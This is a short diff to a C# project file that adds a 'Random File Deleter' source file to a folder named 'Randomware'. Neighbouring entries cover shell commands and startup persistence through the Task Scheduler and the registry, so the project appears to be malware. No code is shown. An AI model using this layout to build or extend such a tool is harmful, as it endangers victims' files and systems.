@@ -209,6 +209,7 @@
     <Compile Include="Armitage\Randomware\Dialog.Designer.cs">
       <DependentUpon>Dialog.cs</DependentUpon>
     </Compile>
+    <Compile Include="Armitage\Randomware\Random File Deleter.cs" />
     <Compile Include="Armitage\Shell\Command Types.cs" />
     <Compile Include="Armitage\Startup\Task Scheduler.cs" />
     <Compile Include="Armitage\Startup\Via Registry.cs" />
